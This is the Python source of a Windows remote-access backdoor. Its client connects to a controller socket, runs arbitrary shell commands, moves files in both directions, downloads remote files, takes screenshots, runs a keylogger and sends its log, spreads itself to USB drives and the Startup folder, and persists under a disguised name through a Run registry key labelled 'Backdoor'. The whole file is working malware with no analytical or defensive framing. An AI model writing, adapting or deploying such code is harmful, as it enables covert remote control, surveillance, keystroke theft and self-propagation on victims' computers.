#!/usr/bin/python
import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import threading
import keylogger
import win32api

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())
    
def reliable_recv():
    data = ""
    while 1:
        try:
            data = data + sock.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue 
def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), temp]))
    except:
        admin = "[!!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"
        
def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_files:
        out_files.write(get_response.content)
        
def usbspreading():
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print(drives)
        for drive in drives:
            if "C:\\" == drive:
                copy2(__file__, bootfolder)
            else:
                copy2(__file__, drive)
        time.sleep(3)

def connection():
    while 1:
        time.sleep(20)
        try:
            sock.connect(("LOCALHOST", 54321))
            shell()
            sock.close()
        except:
            connection()

def shell():
    while 1:
        command = reliable_recv()
        if command == 'q':
            continue
        elif command == "remove_target":
            break
        elif command[:7] == "sendall":
            subprocess.Popen(command[8:], shell=True)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            file_path = os.path.join(os.getcwd(), command[9:])
            if os.path.exists(file_path):          
                with open(command[9:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()).decode())
            else:
                f = "FDNE"
                reliable_send(f)
                continue
        elif command[:6] == "upload":
            file_data = reliable_recv()
            if file_data == "FDNE":
                continue
            else:
                with open(command[7:], "wb") as fin:
                    fin.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded File From Specified URL!")
            except:
                reliable_send("[!!] Failed To Download That File")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()).decode())
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed To Take Screenshot")
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("Can't Perform The Check")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started")
            except:
                reliable_send("[!!] Failed To Start!")
        elif command[:12] == "keylog_start":
            t1 = threading.Thread(target=keylogger.start)
            t1.start()
        elif command[:11] == "keylog_dump":
            if os.path.exists(keylogger_path):          
                with open(keylogger_path, "rb") as file:
                    reliable_send(base64.b64encode(file.read()).decode())
            else:
                f = "FDNE"
                reliable_send(f)
                continue
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            result = result.decode()
            reliable_send(result)

if os.name == 'nt':
    keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
    location = os.environ["appdata"] + "\\windows32.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell = True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
sock.close()